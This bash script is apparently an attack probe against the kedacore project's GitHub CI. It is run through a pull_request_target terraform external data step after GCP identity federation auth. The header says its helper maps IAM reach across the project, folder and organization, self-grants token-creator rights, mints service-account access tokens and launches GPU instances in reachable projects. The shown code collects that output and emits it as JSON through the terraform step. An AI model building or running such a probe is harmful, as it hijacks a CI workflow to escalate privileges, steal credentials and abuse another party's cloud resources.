#!/usr/bin/env bash
# c211-i120470 probe: IAM-reach survey of the kedacore GCP WIF identity.
# Runs inside the pull_request_target 'Validate PR' terraform data.external step
# AFTER google-github-actions/auth@v3. Stdlib REST: STS exchange + SA
# impersonation, then cloudresourcemanager testIamPermissions/getIamPolicy on
# project + folder + organization, projects/folders lists, iam serviceAccounts,
# conditional self-grant TokenCreator + generateAccessToken per SA, and a
# conditional single on-demand GPU marker per NEW reachable project.
# Emits ONE json object on stdout (terraform external data source contract).
set +e
RAW="${C211_IAMX_RAW:-/tmp/c211_i120470_raw.txt}"
export C211_IAMX_RAW="$RAW"
: > "$RAW"
cd "$(dirname "$0")" 2>/dev/null
python3 ./gcp_iamx.py run >>"$RAW" 2>&1
rc=$?
printf '%s\n' "PROBE_EXIT=$rc" >> "$RAW"
python3 - "$RAW" <<'PYEOF'
import json, sys
raw = open(sys.argv[1], encoding='utf-8', errors='replace').read()
sections, cur, buf = {}, 'header', []
for line in raw.splitlines():
    if line.startswith('== ') and line.rstrip().endswith(' =='):
        if buf:
            sections[cur] = '\n'.join(buf); buf = []
        cur = line.strip().strip('=').strip()
    else:
        buf.append(line)
if buf:
    sections[cur] = '\n'.join(buf)
out, seen = {}, {}
for k, v in sections.items():
    key = k.replace(' ', '_').replace('/', '_').replace('(', '').replace(')', '')
    key = key.replace('--', '').replace('__', '_')[:64] or 'section'
    if key in seen:
        seen[key] += 1; key = '%s#%d' % (key[:60], seen[key])
    else:
        seen[key] = 0
    out[key] = v[:6000]
print(json.dumps(out))
PYEOF
exit 0
